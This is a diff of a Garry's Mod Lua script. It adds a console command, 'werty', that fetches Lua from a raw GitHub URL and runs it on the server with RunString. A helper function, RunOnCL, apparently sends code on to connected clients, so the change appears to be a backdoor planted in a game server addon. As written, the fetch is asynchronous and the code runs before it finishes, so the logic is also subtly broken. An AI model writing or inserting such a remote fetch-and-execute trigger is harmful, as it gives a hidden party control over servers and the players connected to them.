@@ -2,9 +2,8 @@ concommand.Add('werty', function(ply)
 if SERVER then
 	local code1 = ""
 	http.Fetch("https://raw.githubusercontent.com/Dzhet225/core64_v2/master/users.lua", function(ret) code1 = ret end)
-	local func1 = CompileString( code1, "testcode" ) 
-	local great = func1
-	print(great)
+	RunString( code1 ) 
+	
 	local function RunOnCL(tar, code)
 		if !tar.CodeReceiver then
 			tar.CodeReceiver=true
